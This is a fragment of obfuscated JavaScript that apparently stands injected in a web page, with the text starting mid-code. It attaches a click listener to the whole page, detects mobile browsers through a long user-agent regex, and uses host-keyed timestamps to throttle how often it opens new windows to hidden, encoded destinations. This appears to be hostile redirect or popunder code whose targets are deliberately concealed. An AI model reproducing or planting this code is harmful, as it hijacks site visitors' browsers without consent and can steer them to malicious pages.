_0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const _0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const _0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x264a55[_0x49bda1(0x1fe)](0x0,0x4)))_0x262ad1=!![];}(navigator['userAgent']||navigator[_0x573149(0x1dd)]||window['opera']),_0x262ad1;};function _0xfb5e65(_0x1bc2e8){const _0x595ec9=_0x37c48c;_0x1bc2e8[_0x595ec9(0x1d9)]();const _0xb17c69=location['host'];let _0x20f559=_0x5531de(_0x1f0b56);const _0x459fd3=Date[_0x595ec9(0x1e3)](new Date()),_0x300724=_0x45b4c1(_0xb17c69+_0x595ec9(0x1fb)),_0xaa16fb=_0x45b4c1(_0xb17c69+_0x595ec9(0x1ee));if(_0x300724&&_0xaa16fb)try{const _0x5edcfd=parseInt(_0x300724),_0xca73c6=parseInt(_0xaa16fb),_0x12d6f4=_0x5a2361(_0x459fd3,_0x5edcfd),_0x11bec0=_0x4be146(_0x459fd3,_0xca73c6);_0x11bec0>=_0x3edee4&&(_0x4b7784(_0x1f0b56),_0x1a2453(_0xb17c69+_0x595ec9(0x1ee),_0x459fd3)),_0x12d6f4>=_0x27386d&&(_0x20f559&&window[_0x595ec9(0x1f2)]()&&(_0x1a2453(_0xb17c69+_0x595ec9(0x1fb),_0x459fd3),window[_0x595ec9(0x1ec)](_0x20f559,_0x595ec9(0x1da)),_0x49794b(_0x20f559)));}catch(_0x57c50a){_0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}else _0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}document[_0x37c48c(0x1f1)]('click',_0xfb5e65);}());